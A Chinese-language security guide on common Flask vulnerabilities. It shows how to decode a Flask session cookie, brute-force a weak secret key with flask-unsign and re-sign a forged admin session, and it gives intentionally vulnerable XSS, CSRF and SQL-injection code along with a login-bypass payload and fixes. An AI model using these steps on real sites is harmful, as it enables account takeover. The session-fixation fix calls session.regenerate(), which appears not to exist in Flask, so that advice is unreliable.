---
slug: /flask-security
title: Flask 常见利用点
icon: python-icon
sidebar_position: 17
---

## Secret Key（Flask-Login）

**Flask Login 将会话信息签名后存储在客户端 Cookie 中，Secret Key 一旦泄露或被碰撞，攻击者即可伪造任意身份的 Session。** [Flask_Login](https://flask-login.readthedocs.io/en/latest/)维护[Flask Session](https://flask.palletsprojects.com/en/latest/api/#sessions)，实现登录、退出等会话管理功能。Flask Login 使用的是客户端方式存储会话信息，也就是将会话相关身份信息编码后存储在客户端 Cookie 中，并使用密钥进行签名。而一般网站使用的是服务端会话方案，客户端的 Session 只是一个标识符，传到服务端后会通过该标识符找到对应的用户身份信息。

**客户端会话方案的核心代价是编码内容可被任意解开，敏感信息不能存入其中。** 客户端储存SESSION信息的方案优势是处理会话信息时速度比较快，因为没有服务端储存步骤。后段服务比较容易横向扩容，因为不用去解决一个用户访问多个服务器间的会话同步问题。缺点也很明显，客户端会话模式中编码部分的内容是可以随意解开的，所以不能储存敏感信息。另外储存内容大小也受到Cookie大小限制，默认4KB。同时Flask无法在服务端直接失效某个会话。

以下示例演示 Session 的结构组成，以及如何用 zlib 解压还原其中的 JSON 数据：

```bash
# 一个SESSION例子
# .eJyrVirKz0lVslJKTMnNzFPSUSotTi2Kz0wBihgYmMP4eYm5IDVpqamZSrUApTkQLA.Zx95Jg.OVL4T3E_j2jiPZPVcihVwRE_Emo
# 其结构为：BASE64数据.时间戳.HMAC签名
# 如果开头第一个字符为.意味着使用DEFLATE算法压缩过，可以使用zlib解压

feei@Feeis-Work-Macbook ~ % echo "eJyrVirKz0lVslJKTMnNzFPSUSotTi2Kz0wBihgYmMP4eYm5IDVpqamZSrUApTkQLA" | base64 -d | perl -e 'use Compress::Raw::Zlib;my $d=new Compress::Raw::Zlib::Inflate();my $o;undef $/;$d->inflate(<>,$o);print $o;'
{"role":"admin","user_id":"007","user_name":"feei"}
```

**Secret Key 如果设置得过于简单，可以通过字典碰撞直接还原出密钥，进而获得完整的 Session 伪造能力。** Secret Key如果设置的是比较简单的，可以通过[Flask Unsign](https://github.com/Paradoxis/Flask-Unsign)碰撞出来的。

以下示例使用 flask-unsign 对 Session Cookie 进行字典爆破，还原出原始密钥：

```bash
feei@Feeis-Work-Macbook Downloads % flask-unsign --unsign --cookie ".eJyrVirKz0lVslJKTMnNzFPSUSotTi2Kz0wBihgYmMP4eYm5IDVpqamZSrUApTkQLA.Zx95Jg.OVL4T3E_j2jiPZPVcihVwRE_Emo" --wordlist wordlist.txt 
[*] Session decodes to: {'role': 'admin', 'user_id': '007', 'user_name': 'feei'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 1 attemptsei_cn
'test_secret_key_feei_cn'
```

**知道 Secret Key 后，可更改数据并重新签名出新的 Session，替换到浏览器 Cookie 中即可以任意用户身份访问。**

以下工具函数实现 Flask Session Cookie 的解码与重新编码：

```python
#!/usr/bin/env python3
"""
    Flask Session Cookie Decoder/Encoder
    https://github.com/noraj/flask-session-cookie-manager
"""

import zlib
from itsdangerous import base64_decode
import ast

from flask.sessions import SecureCookieSessionInterface

class MockApp(object):

    def __init__(self, secret_key):
        self.secret_key = secret_key

def encode(secret_key, session_cookie_structure):
    """ Encode a Flask session cookie """
    try:
        app = MockApp(secret_key)

        session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))
        si = SecureCookieSessionInterface()
        s = si.get_signing_serializer(app)

        return s.dumps(session_cookie_structure)
    except Exception as e:
        return "[Encoding error] {}".format(e)
        raise e

def decode(session_cookie_value, secret_key=None):
    """ Decode a Flask cookie  """
    try:
        if (secret_key == None):
            compressed = False
            payload = session_cookie_value

            if payload.startswith('.'):
                compressed = True
                payload = payload[1:]

            data = payload.split(".")[0]

            data = base64_decode(data)
            if compressed:
                data = zlib.decompress(data)

            return data
        else:
            app = MockApp(secret_key)

            si = SecureCookieSessionInterface()
            s = si.get_signing_serializer(app)

            return s.loads(session_cookie_value)
    except Exception as e:
        return "[Decoding error] {}".format(e)
        raise e

if __name__ == "__main__":
    # Decode
    session = '.eJyrVirKz0lVslJKTMnNzFPSUSotTi2Kz0wBihgYmMP4eYm5IDVpqamZSrUApTkQLA.Zx95Jg.OVL4T3E_j2jiPZPVcihVwRE_Emo'
    print(decode(session))

    # Encode
    data = "{'role': 'admin', 'user_id': '007', 'user_name': 'feei'}"
    secret_key = 'test_secret_key_feei_cn'
    print(encode(secret_key, data))
```

<!-- truncate -->

## XSS

**关闭模板自动转义后，外部输入可直接注入为 HTML，导致存储型或反射型 XSS。** 使用 `autoescape true` 来转义模板中使用了外部输入的变量。

以下漏洞代码示例展示了关闭 autoescape 时模板如何直接渲染用户输入：

```python
from flask import Flask, render_template, request

app = Flask(__name__)

@app.route('/')
def index():
    input = request.args.get('input')
    return render_template('index.html', input=input)
```

```markup
<!DOCTYPE html>
{% autoescape false %}
<html>
<body>
    <p>{{ input }}</p>
</body>
{% endautoescape %}
</html>
```

## CSRF

**未对表单请求校验来源时，攻击者可诱导已登录用户触发任意状态变更操作。** 使用 `Flask-WTF` 引入 CSRF Token 验证可有效防御此类攻击。

以下漏洞代码展示了缺少 CSRF 保护的密码修改接口：

```python
from flask import Flask, render_template, request, redirect, url_for

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/change_password', methods=['POST'])
def change_password():
    new_password = request.form.get('new_password')
    # Change password logic here
    return redirect(url_for('index'))
```

```markup
<!DOCTYPE html>
<html>
<head>
    <title>CSRF Example</title>
</head>
<body>
    <form method="post" action="{{ url_for('change_password') }}">
   	 <label for="new_password">New Password:</label>
   	 <input type="password" name="new_password" required>
   	 <button type="submit">Change Password</button>
    </form>
</body>
</html>
```

引入 `Flask-WTF` 后，在后端启用 CSRFProtect 并在表单中注入 `csrf_token()`，即可完成请求来源校验：

```python
from flask import Flask, render_template, request, redirect, url_for
from flask_wtf.csrf import CSRFProtect

app = Flask(__name__)
app.config['SECRET_KEY'] = 'your_secret_key'  # Set a secret key for CSRF protection
csrf = CSRFProtect(app)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/change_password', methods=['POST'])
def change_password():
    new_password = request.form.get('new_password')
    # Change password logic here
    return redirect(url_for('index'))
```

```markup
<!DOCTYPE html>
<html>
<head>
    <title>CSRF Example</title>
</head>
<body>
    <form method="post" action="{{ url_for('change_password') }}">
   	 {{ csrf_token() }}
   	 <label for="new_password">New Password:</label>
   	 <input type="password" name="new_password" required>
   	 <button type="submit">Change Password</button>
    </form>
</body>
</html>
```

## SQL Injection

**直接将用户输入拼接进 SQL 语句会导致注入，攻击者可通过构造特殊字符绕过鉴权或读取任意数据。** 修复方式是改用参数化查询，让数据库驱动负责处理转义。

以下漏洞代码展示了直接拼接用户输入的 SQL 查询：

```python
from flask import Flask, request, render_template
import sqlite3

app = Flask(__name__)

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']

    # Vulnerable SQL query
    query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"

    # Execute the query
    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()
    cursor.execute(query)
    user = cursor.fetchone()
    conn.close()

    if user:
   	 return 'Login successful'
    else:
   	 return 'Login failed'
```

password传入`' OR '1'='1'; --`，即可登录任何账户。

```sql
SELECT * FROM users WHERE username = '' OR '1'='1'; --' AND password = '';
```

改用参数化查询，将用户输入作为独立参数传递，数据库驱动会自动处理转义：

```python
from flask import Flask, request, render_template
import sqlite3

app = Flask(__name__)

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']

    # Secure SQL query using parameterized query
    query = "SELECT * FROM users WHERE username = ? AND password = ?"

    # Execute the query with parameters
    conn = sqlite3.connect('database.db')
    cursor = conn.cursor()
    cursor.execute(query, (username, password))
    user = cursor.fetchone()
    conn.close()

    if user:
   	 return 'Login successful'
    else:
   	 return 'Login failed'
```

## 登录爆破

**登录接口若不限制重试次数，攻击者可对账号密码进行无限次枚举。** 通过在 Session 中记录失败次数并在达到阈值后锁定账户，可有效阻断爆破行为。

以下代码示例展示了基于 Session 计数器的登录尝试限制机制：

```python
from flask import Flask, request, session

app = Flask(__name__)
app.config['MAX_LOGIN_ATTEMPTS'] = 3

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']

    # Check if the user is locked out
    if 'login_attempts' in session and session['login_attempts'] >= app.config['MAX_LOGIN_ATTEMPTS']:
        return 'Account locked. Please try again later.'

    # Validate the username and password
    # ...

    # Update login attempts
    if 'login_attempts' in session:
        session['login_attempts'] += 1
    else:
        session['login_attempts'] = 1

    # Authenticate the user
    # ...
```

## Session Fixed

**Session 固定攻击利用登录前后 Session ID 不变的漏洞，攻击者可预先植入 Session ID 并在用户登录后直接接管会话。** 登录成功后立即重新生成 Session ID 是最直接的防御手段。

以下代码示例展示了登录后通过 `session.regenerate()` 刷新 Session ID：

```python
from flask import Flask, request, session

app = Flask(__name__)
app.secret_key = 'your_secret_key'

@app.route('/login', methods=['POST'])
def login():
    # Authenticate the user
    # ...

    # Regenerate session ID after successful login
    session.regenerate()
    # ...
```

## 未授权访问

**路由缺少身份校验时，任何人都能直接访问本应受保护的管理功能。** 在每个需要鉴权的路由处理函数中显式检查 Session 中的角色信息，是最基础的防护方式。

以下代码示例展示了基于 Session 角色字段的管理后台访问控制：

```python
from flask import Flask, request, session

app = Flask(__name__)

@app.route('/admin_dashboard')
def admin_dashboard():
    if 'role' in session and session['role'] == 'admin':
   	 # User has admin role and is authorized to access the admin dashboard
   	 # ...
   	 return 'Admin dashboard page'
    else:
   	 # User is not authorized
   	 return 'Unauthorized access'
```

## 鉴权

**仅校验用户是否已登录而不校验资源归属，会导致水平越权，攻击者可直接访问其他用户的数据。** 应在路由层同时验证 Session 中的用户 ID 与请求资源的归属是否一致。

以下代码示例展示了基于 Session 用户 ID 的用户资料访问权限校验：

```python
from flask import Flask, request, session

app = Flask(__name__)

@app.route('/user_profile/<int:user_id>')
def user_profile(user_id):
    if 'user_id' in session and session['user_id'] == user_id:
   	 # User is authorized to access their own profile
   	 # ...
   	 return 'User profile page'
    else:
   	 # User is not authorized
   	 return 'Unauthorized access'
```

## 任意文件上传

**不限制上传文件类型时，攻击者可上传可执行脚本并通过 Web 请求直接触发，获得服务器控制权。** 应在服务端对文件扩展名进行白名单校验，并使用 `secure_filename` 规范化文件名以防路径穿越。

以下代码示例展示了基于扩展名白名单的文件上传校验逻辑：

```python
from flask import Flask, request, flash, redirect, url_for
from werkzeug.utils import secure_filename
import os

app = Flask(__name__)
app.config['UPLOAD_FOLDER'] = 'uploads'
app.config['ALLOWED_EXTENSIONS'] = {'txt', 'pdf', 'png', 'jpg', 'jpeg', 'gif'}

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in app.config['ALLOWED_EXTENSIONS']

@app.route('/upload', methods=['POST'])
def upload_file():
    if 'file' not in request.files:
   	 flash('No file part')
   	 return redirect(request.url)

    file = request.files['file']

    if file.filename == '':
   	 flash('No selected file')
   	 return redirect(request.url)

    if file and allowed_file(file.filename):
   	 filename = secure_filename(file.filename)
   	 file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))
   	 flash('File successfully uploaded')
   	 return redirect(url_for('uploaded_file', filename=filename))
    else:
   	 flash('Invalid file type')
   	 return redirect(request.url)
```

## 敏感信息泄漏

**默认错误页面会将堆栈跟踪、文件路径、数据库结构等调试信息直接暴露给外部访问者。** 通过注册自定义错误处理器，将错误响应替换为固定内容的页面，可避免敏感信息外泄。

以下代码示例展示了如何注册 404 和 500 的自定义错误页面处理器：

```python
from flask import Flask, render_template

app = Flask(__name__)

@app.errorhandler(404)
def page_not_found(error):
    return render_template('404.html'), 404

@app.errorhandler(500)
def internal_server_error(error):
    return render_template('500.html'), 500
```
